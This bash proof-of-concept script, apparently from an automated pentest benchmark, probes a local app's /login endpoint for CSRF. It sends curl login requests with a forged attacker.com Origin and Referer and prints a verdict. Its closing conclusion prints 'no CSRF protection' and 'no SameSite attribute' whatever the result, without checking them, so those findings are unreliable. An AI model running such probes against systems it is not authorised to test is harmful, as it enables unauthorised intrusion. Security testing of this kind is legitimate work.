#!/bin/bash
# POC: Demonstrates CSRF vulnerability on login endpoint by performing a cross-origin login request without CSRF token validation or origin checking
# Target: ./repo
# Created: 2025-11-07T18:20:59.340Z
# Session: benchmark-XBEN-023-24-mhp62996

# CSRF Vulnerability POC - Login Endpoint
# This script demonstrates that the /login endpoint accepts cross-origin requests
# without any CSRF protection mechanisms (no CSRF tokens, no origin validation)

TARGET_URL="${1:-http://localhost:8000}"
LOGIN_ENDPOINT="${TARGET_URL}/login"

echo "[*] CSRF Vulnerability POC - Login Endpoint"
echo "[*] Target: $LOGIN_ENDPOINT"
echo ""

# Test 1: Normal login request (baseline)
echo "[TEST 1] Baseline - Normal login request from same origin"
echo "---"
RESPONSE=$(curl -s -i -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test" \
  "$LOGIN_ENDPOINT" 2>&1)

echo "$RESPONSE" | head -20
SESSION_COOKIE=$(echo "$RESPONSE" | grep -i "set-cookie" | grep -oP 'session=\K[^;]*' | head -1)
echo ""
echo "[*] Session cookie received: ${SESSION_COOKIE:0:20}..."
echo ""

# Test 2: Cross-origin login request (CSRF attack simulation)
echo "[TEST 2] CSRF Attack - Cross-origin login request from attacker.com"
echo "---"
CSRF_RESPONSE=$(curl -s -i -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: http://attacker.com" \
  -H "Referer: http://attacker.com/malicious-page" \
  -d "username=attacker&password=attacker" \
  "$LOGIN_ENDPOINT" 2>&1)

echo "$CSRF_RESPONSE" | head -20
CSRF_SESSION=$(echo "$CSRF_RESPONSE" | grep -i "set-cookie" | grep -oP 'session=\K[^;]*' | head -1)
echo ""

# Analyze results
echo ""
echo "[ANALYSIS]"
echo "---"

if echo "$CSRF_RESPONSE" | grep -q "302\|200"; then
  echo "✓ VULNERABLE: Application accepts cross-origin login request"
  echo "  - Status: $(echo "$CSRF_RESPONSE" | head -1)"
  
  if [ -n "$CSRF_SESSION" ]; then
    echo "  - Session cookie set despite cross-origin request: ${CSRF_SESSION:0:20}..."
    echo "  - CSRF token validation: NOT PERFORMED"
    echo "  - Origin validation: NOT PERFORMED"
    echo "  - Referer validation: NOT PERFORMED"
  fi
else
  echo "✗ PROTECTED: Application rejected cross-origin request"
fi

echo ""
echo "[CONCLUSION]"
echo "---"
echo "The login endpoint does not implement CSRF protection:"
echo "1. No CSRF tokens required"
echo "2. No Origin/Referer validation"
echo "3. No SameSite cookie attribute"
echo "4. Cross-origin requests are accepted and processed"
echo ""
echo "An attacker can craft a malicious webpage that performs unauthorized"
echo "login actions when visited by a user, potentially leading to session"
echo "fixation or account enumeration attacks."